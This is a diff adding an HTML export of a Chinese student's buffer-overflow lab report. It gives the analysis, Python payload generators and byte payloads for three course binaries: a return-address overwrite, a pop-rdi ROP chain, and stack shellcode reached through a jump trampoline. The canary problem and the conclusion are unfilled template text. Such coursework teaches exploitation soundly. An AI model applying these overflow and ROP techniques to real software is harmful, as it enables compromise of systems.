@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>report.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<h1 id="%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C">栈溢出攻击实验</h1>
+<h2 id="%E9%A2%98%E7%9B%AE%E8%A7%A3%E5%86%B3%E6%80%9D%E8%B7%AF">题目解决思路</h2>
+<p>出于对彩色分块汇编代码的好奇，我下载了ida；发现前3个problem思路框架相似，本质是让程序
+执行我想要的代码，一步步进入圈套，最后输出目标字符串；第4个problem的关键是绕过金丝雀返回，所以需要调用函数</p>
+<h3 id="problem-1">Problem 1:</h3>
+<ul>
+<li><strong>分析</strong>：此题较为简单，我们只需要构造payload实现两个功能：覆盖buffer和ebp，以及将返回地址覆盖为我需要跳转的地址。
+第一步很好解决，查看func的内部定义可以知道，buffer和ebp都是8字节，所以我们可以用16字节的'A&quot;进行覆盖；
+第二步，我们跳转到哪里可以打印目标字符串呢？在汇编代码中查找'Yes!I like ICS!'，发现打印指令出现在func1中，所以我们只需要让程序跳转到func1的入口处，即为0x401216，将其补全为8字节并按照小端存取的方式追加在第一步构造的字符串后。所以我们就得到了十六字节的payload。</li>
+<li><strong>解决方案</strong>：payload = b'AAAAAAAAAAAAAAAA\x16\x12@\x00\x00\x00\x00\x00'</li>
+</ul>
+<pre class="hljs"><code><div><span class="hljs-keyword">import</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>
+<span class="hljs-title">padding_len</span> = 16 # <span class="hljs-title">buffer</span>+<span class="hljs-title">ebp</span>
+# <span class="hljs-title">func1</span> 函数的起始地址
+<span class="hljs-title">target_addr</span> = 0<span class="hljs-title">x401216</span>
+<span class="hljs-title">padding</span> = <span class="hljs-title">b</span>'<span class="hljs-title">A</span>' * <span class="hljs-title">padding_len</span>
+<span class="hljs-title">address_bytes</span> = <span class="hljs-title">struct</span>.<span class="hljs-title">pack</span>("&lt;Q", target_addr)
+payload = padding + address_bytes
+print(payload)
+with open("ans1.txt", "wb") as f:
+    f.write(payload)
+print(f"Payload已生成，跳转目标: {hex(target_addr)}")
+</span></div></code></pre>
+<ul>
+<li><strong>结果</strong>：<img src="file:///home/jy0307/.cache/Microsoft/DeveloperTools/attack-lab-WuJiayi0307/reports/imgs/image1.png" alt="image"></li>
+</ul>
+<h3 id="problem-2">Problem 2:</h3>
+<ul>
+<li><strong>分析</strong>：乍一看会觉得这题和problem1很像，于是我们顺着problem1的思路寻找'Yes!I like ICS!'，发现它出现在func2中，入口地址为0x401216，但是func2需要两个参数，函数会检查第一个参数的值是否为1016，那我们怎样把1016这个参数传给func2呢，这需要我们在跳转前已经把这个数放在寄存器rdi中，而此题的栈是不可执行的，所以我们需要在本题已有的汇编代码中找到对应的指令，使用指令：</li>
+</ul>
+<pre class="hljs"><code><div>objdump -d problem2 | grep -A <span class="hljs-number">1</span> <span class="hljs-string">"pop.*%rdi"</span>
+</div></code></pre>
+<p>得到地址0x4012c7；
+所以我们需要在覆盖buffer和ebp后，使程序依次跳转到0x4012c7和0x401216；
+与problem1同理，在16字节'A'后按照小端存取，先追加所需move rdi指令的地址，再填入1016，最后填入func2的地址（注意全部扩充为8字节）。</p>
+<ul>
+<li><strong>解决方案</strong>：payload = b'AAAAAAAAAAAAAAAA\xc7\x12@\x00\x00\x00\x00\x00\xf8\x03\x00\x00\x00\x00\x00\x00\x16\x12@\x00\x00\x00\x00\x00'</li>
+</ul>
+<pre class="hljs"><code><div><span class="hljs-keyword">import</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>
+<span class="hljs-title">padding_len</span> = 16 # <span class="hljs-title">buffer</span>+<span class="hljs-title">ebp</span>
+
+<span class="hljs-title">gadget_addr</span> = 0<span class="hljs-title">x4012c7</span>
+<span class="hljs-title">right_addr</span> = 0<span class="hljs-title">x3F8</span>
+# <span class="hljs-title">func1</span> 函数的起始地址
+<span class="hljs-title">target_addr</span> = 0<span class="hljs-title">x401216</span>
+
+<span class="hljs-title">padding</span> = <span class="hljs-title">b</span>'<span class="hljs-title">A</span>' * <span class="hljs-title">padding_len</span>
+<span class="hljs-title">payload</span> = <span class="hljs-title">padding</span>
+<span class="hljs-title">payload</span>+=<span class="hljs-title">struct</span>.<span class="hljs-title">pack</span>("&lt;Q", gadget_addr)
+payload+=struct.pack("&lt;Q", right_addr)
+payload+=struct.pack("&lt;Q", target_addr)
+print(payload)
+with open("ans2.txt", "wb") as f:
+    f.write(payload)
+
+print(f"Payload已生成，跳转目标: {hex(target_addr)}")
+</span></div></code></pre>
+<ul>
+<li><strong>结果</strong>：<img src="file:///home/jy0307/.cache/Microsoft/DeveloperTools/attack-lab-WuJiayi0307/reports/imgs/image2.png" alt="image"></li>
+</ul>
+<h3 id="problem-3">Problem 3:</h3>
+<ul>
+<li><strong>分析</strong>：思路依旧与前两题类似，区别在于这次我们找不到现成的move指令，好在这题的栈是可执行的，也就是说我们可以将想要完成的指令写成机器码，压入栈中，返回地址处则覆盖为跳转函数的地址，让函数在本该返回的时候跳转回栈的开头，执行目标指令。（具体见代码注释）</li>
+<li><strong>解决方案</strong>：payload = b'jr_\xb8\x16\x12@\x00\xff\xd0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90BBBBBBBB4\x13@\x00\x00\x00\x00\x00'</li>
+</ul>
+<pre class="hljs"><code><div><span class="hljs-keyword">import</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>
+# <span class="hljs-title">func1</span>的地址
+<span class="hljs-title">func1_addr</span> = 0<span class="hljs-title">x401216</span>
+
+# <span class="hljs-title">jmp_xs</span>的地址,跳回<span class="hljs-title">buffer</span>开头
+<span class="hljs-title">jmp_xs_addr</span> = 0<span class="hljs-title">x401334</span>
+# 构造 <span class="hljs-title">Shellcode</span> 调用 <span class="hljs-title">func1</span>(114)
+# 汇编逻辑：
+#   <span class="hljs-title">push</span> 0<span class="hljs-title">x72</span>       (将 114 压栈)
+#   <span class="hljs-title">pop</span> <span class="hljs-title">rdi</span>         (弹入 <span class="hljs-title">RDI</span> 寄存器，这是 <span class="hljs-title">func1</span> 的参数)
+#   <span class="hljs-title">mov</span> <span class="hljs-title">eax</span>, 0<span class="hljs-title">x401216</span> (将 <span class="hljs-title">func1</span> 地址放入 <span class="hljs-title">RAX</span>)
+#   <span class="hljs-title">call</span> <span class="hljs-title">rax</span>        (调用 <span class="hljs-title">func1</span>)
+
+<span class="hljs-title">shellcode</span> = <span class="hljs-title">b</span>''
+<span class="hljs-title">shellcode</span> += <span class="hljs-title">b</span>'\<span class="hljs-title">x6a</span>\<span class="hljs-title">x72</span>'                    # <span class="hljs-title">push</span> 0<span class="hljs-title">x72</span> (114)
+<span class="hljs-title">shellcode</span> += <span class="hljs-title">b</span>'\<span class="hljs-title">x5f</span>'                        # <span class="hljs-title">pop</span> <span class="hljs-title">rdi</span>
+<span class="hljs-title">shellcode</span> += <span class="hljs-title">b</span>'\<span class="hljs-title">xb8</span>\<span class="hljs-title">x16</span>\<span class="hljs-title">x12</span>\<span class="hljs-title">x40</span>\<span class="hljs-title">x00</span>'        # <span class="hljs-title">mov</span> <span class="hljs-title">eax</span>, 0<span class="hljs-title">x401216</span> (<span class="hljs-title">func1_addr</span>)
+<span class="hljs-title">shellcode</span> += <span class="hljs-title">b</span>'\<span class="hljs-title">xff</span>\<span class="hljs-title">xd0</span>'                    # <span class="hljs-title">call</span> <span class="hljs-title">rax</span>
+<span class="hljs-title">print</span>(<span class="hljs-title">f</span>"<span class="hljs-title">Shellcode</span> 长度:</span> {len(shellcode)} 字节<span class="hljs-string">")
+
+# shellcode在buffer最开头
+# buffer32字节，填入 shellcode，剩下的用 NOP (0x90) 填充
+padding_len = 32 - len(shellcode)
+payload = shellcode + b'\x90' * padding_len
+
+# 覆盖 RBP 
+payload += b'B' * 8
+
+# 覆盖返回地址指向 jmp_xs
+# func返回时执行jmp_xs，跳回shellcode
+payload += struct.pack('&lt;Q', jmp_xs_addr)
+
+print(f"</span>Payload 总长度: {len(payload)} 字节<span class="hljs-string">")
+
+with open("</span>ans3.txt<span class="hljs-string">", "</span>wb<span class="hljs-string">") as f:
+    f.write(payload)
+
+print(payload)
+</span></div></code></pre>
+<ul>
+<li><strong>结果</strong>：<img src="file:///home/jy0307/.cache/Microsoft/DeveloperTools/attack-lab-WuJiayi0307/reports/imgs/image3.png" alt="image"></li>
+</ul>
+<h3 id="problem-4">Problem 4:</h3>
+<ul>
+<li><strong>分析</strong>：体现canary的保护机制是什么</li>
+<li><strong>解决方案</strong>：payload是什么，即你的python代码or其他能体现你payload信息的代码/图片</li>
+<li><strong>结果</strong>：附上图片</li>
+</ul>
+<h2 id="%E6%80%9D%E8%80%83%E4%B8%8E%E6%80%BB%E7%BB%93">思考与总结</h2>
+<h2 id="%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</h2>
+<p>列出在准备报告过程中参考的所有文献、网站或其他资源，确保引用格式正确。</p>
+
+</body>
+</html>
